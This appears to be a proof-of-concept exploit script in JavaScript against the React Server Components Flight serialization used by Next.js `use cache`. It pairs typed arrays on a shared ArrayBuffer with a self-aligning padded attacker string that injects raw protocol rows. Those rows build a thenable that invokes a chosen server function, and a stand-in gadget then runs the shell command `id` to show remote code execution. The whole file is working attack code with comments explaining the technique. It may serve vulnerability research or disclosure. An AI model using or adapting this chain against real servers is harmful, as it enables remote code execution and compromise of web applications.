/* FULL CHAIN (single process, mirrors Next.js `use cache`):
   producer renderToReadableStream  ->  tee  ->  consumer createFromReadableStream
   A `use cache` value with two typed arrays on a shared ArrayBuffer + an attacker
   string corrupts the Flight stream so the attacker string is parsed as protocol
   rows, injecting a thenable whose `.then` is an attacker-chosen server reference. */
const { renderToReadableStream } = require('react-server-dom-webpack/server.node');
const { createFromReadableStream } = require('react-server-dom-webpack/client.node');
const { execSync } = require('child_process');

// ---- "gadget": any function reachable via the app's bundled module map ----
let PWNED = null;
const GADGET_MOD = 'gadget-module-id';
global.__webpack_require__ = (id) => {
  if (id === GADGET_MOD) return { pwn: (a, b) => {
    PWNED = execSync('id').toString().trim();
    console.log('  *** GADGET pwn() EXECUTED -> `id` =', PWNED);
  }};
  throw new Error('no module ' + id);
};
const serverConsumerManifest = {
  moduleMap: {}, moduleLoading: null,
  serverModuleMap: { 'gadget-module-id#pwn': { id: GADGET_MOD, chunks: [], name: 'pwn' } },
};

const SZ = 8192; // typed arrays > 4096 are emitted by reference (detach-prone)

// Injected raw Flight rows. Root row 0 becomes a thenable; its `.then` is server ref $h9.
const INJ = '9:{"id":"gadget-module-id#pwn","bound":null}\n0:{"then":"$h9"}\n';

// Self-align: row 2 (declared 8192, writes 0) swallows `3:T<hex>,` + N note bytes.
// We want that swallow to end exactly where INJ begins.
function buildNote() {
  let pad = SZ; // iterate to fixpoint
  for (let i = 0; i < 8; i++) {
    const total = pad + INJ.length;
    const header = '3:T' + total.toString(16) + ',';
    pad = SZ - header.length;
  }
  return 'P'.repeat(pad) + INJ;
}

(async () => {
  const note = buildNote();
  const buf = new ArrayBuffer(SZ * 2);
  const v1 = new Uint8Array(buf, 0, SZ), v2 = new Uint8Array(buf, SZ, SZ);
  v1.fill(0x41); v2.fill(0x42);

  // PRODUCER: exactly what Next.js does with a `use cache` return value
  const stream = renderToReadableStream({ one: v1, two: v2, note }, {});
  const [toConsumer, toInspect] = stream.tee();

  // show the corrupted wire
  const cs = []; const r = toInspect.getReader();
  for (;;) { const { done, value } = await r.read(); if (done) break; cs.push(Buffer.from(value)); }
  const s = Buffer.concat(cs).toString('latin1');
  console.log('--- corrupted Flight wire (binary runs collapsed) ---');
  console.log('  ' + s.replace(/A{10,}/g, m => '<' + m.length + 'xA>')
                      .replace(/B{10,}/g, m => '<' + m.length + 'xB>')
                      .replace(/P{10,}/g, m => '<' + m.length + 'xP>')
                      .replace(/\n/g, '\n  '));

  // CONSUMER: Next.js createFromReadableStream with the app's real module maps
  console.log('--- consumer decode (in the server process) ---');
  try {
    const v = await createFromReadableStream(toConsumer, { serverConsumerManifest });
    console.log('  decoded root =', v);
  } catch (e) {
    console.log('  consumer note:', String(e && e.message).slice(0, 160));
  }
  console.log('\n>>> RESULT:', PWNED ? 'REMOTE CODE EXECUTION — command output: ' + PWNED : 'no code execution');
})();
